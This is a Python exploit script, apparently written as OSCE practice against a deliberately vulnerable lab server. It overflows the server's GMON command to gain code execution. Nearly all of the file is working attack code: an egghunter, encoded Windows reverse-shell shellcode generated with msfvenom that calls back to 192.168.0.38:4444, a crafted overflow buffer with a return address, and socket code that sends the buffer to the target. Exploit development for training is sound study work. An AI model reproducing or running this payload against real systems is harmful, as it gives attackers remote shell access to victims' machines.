#!/usr/bin/python

# Author Stephen Huggard
# Version 1.0
# This exploit code take advantage of a buffer overflow in the GMON component and returns a reverse shell to 192.168.0.38


import socket
import os
import sys

# 0x62501203 : jmp esp
 
crash = "GMON /.:/"
#root@bt:/pentest/exploits/framework/tools# ./pattern_offset.rb 45336e45 5000
#3519

egg="T00WT00W"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#root@bt:~/Desktop/OSCE/vulnserver# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.38 LPORT=4444 -a x86 --platform windows -f c -b '\x00'
#[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
#unsigned char buf[] = 
revshell=("\xbb\x92\x9b\xc5\x47\xda\xd3\xd9\x74\x24\xf4\x58\x2b\xc9\xb1" +
"\x4f\x31\x58\x14\x83\xc0\x04\x03\x58\x10\x70\x6e\x39\xaf\xfd" +
"\x91\xc2\x30\x9d\x18\x27\x01\x8f\x7f\x23\x30\x1f\x0b\x61\xb9" +
"\xd4\x59\x92\x4a\x98\x75\x95\xfb\x16\xa0\x98\xfc\x97\x6c\x76" +
"\x3e\xb6\x10\x85\x13\x18\x28\x46\x66\x59\x6d\xbb\x89\x0b\x26" +
"\xb7\x38\xbb\x43\x85\x80\xba\x83\x81\xb9\xc4\xa6\x56\x4d\x7e" +
"\xa8\x86\xfe\xf5\xe2\x3e\x74\x51\xd3\x3f\x59\x82\x2f\x09\xd6" +
"\x70\xdb\x88\x3e\x49\x24\xbb\x7e\x05\x1b\x73\x73\x54\x5b\xb4" +
"\x6c\x23\x97\xc6\x11\x33\x6c\xb4\xcd\xb6\x71\x1e\x85\x60\x52" +
"\x9e\x4a\xf6\x11\xac\x27\x7d\x7d\xb1\xb6\x52\xf5\xcd\x33\x55" +
"\xda\x47\x07\x71\xfe\x0c\xd3\x18\xa7\xe8\xb2\x25\xb7\x55\x6a" +
"\x83\xb3\x74\x7f\xb5\x99\x10\x4c\x8b\x21\xe1\xda\x9c\x52\xd3" +
"\x45\x36\xfd\x5f\x0d\x90\xfa\xa0\x24\x64\x94\x5e\xc7\x94\xbc" +
"\xa4\x93\xc4\xd6\x0d\x9c\x8f\x26\xb1\x49\x1f\x77\x1d\x22\xdf" +
"\x27\xdd\x92\xb7\x2d\xd2\xcd\xa7\x4d\x38\x78\xe0\xda\x03\xd3" +
"\xee\x3c\xec\x26\xee\x51\xb0\xaf\x08\x3b\x58\xe6\x83\xd4\xc1" +
"\xa3\x5f\x44\x0d\x7e\xf7\xe5\x9c\xe5\x07\x63\xbd\xb1\x50\x24" +
"\x73\xc8\x34\xd8\x2a\x62\x2a\x21\xaa\x4d\xee\xfe\x0f\x53\xef" +
"\x73\x2b\x77\xff\x4d\xb4\x33\xab\x01\xe3\xed\x05\xe4\x5d\x5c" +
"\xff\xbe\x32\x36\x97\x47\x79\x89\xe1\x47\x54\x7f\x0d\xf9\x01" +
"\xc6\x32\x36\xc6\xce\x4b\x2a\x76\x30\x86\xee\x86\x7b\x8a\x47" +
"\x0f\x22\x5f\xda\x52\xd5\x8a\x19\x6b\x56\x3e\xe2\x88\x46\x4b" +
"\xe7\xd5\xc0\xa0\x95\x46\xa5\xc6\x0a\x66\xec")


#625010B4
buffer = 'A' * (3407-len(revshell)) + egg + revshell + '\x90' * 10 + egghunter + '\x90' * (90-len(egghunter)) + '\x90\x90\xEB\x99' + '\xB4\x10\x50\x62' + 'C' * (5000-3523) 

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.0.17", 5000))
expl.send(crash + buffer)
expl.close()
